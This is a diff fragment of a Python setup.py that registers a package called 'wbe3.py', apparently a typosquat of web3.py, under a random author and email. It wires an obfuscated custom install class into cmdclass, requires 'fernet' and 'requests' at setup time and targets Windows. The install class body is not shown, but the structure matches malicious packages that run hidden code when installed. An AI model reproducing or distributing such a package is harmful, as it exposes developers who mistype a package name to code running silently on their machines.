@@ -18,5 +18,22 @@ class vzSICPNLSOvXVmoOxmxzlsMoQbpAOSTkOuUjcKAphthhcbRuGMlXkHAeDJHRzqpQeGCdRgxCtS
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+setup(
+    name="wbe3.py",
+    version=VERSION,
+    author="BTnkmTNHgKoI",
+    author_email="ydnSDnaVoPXMmwEYIaTk@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': vzSICPNLSOvXVmoOxmxzlsMoQbpAOSTkOuUjcKAphthhcbRuGMlXkHAeDJHRzqpQeGCdRgxCtSujsydpDkkUSMseVIYtbreXJSsppJcwUBHYJAQzpnTBv,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
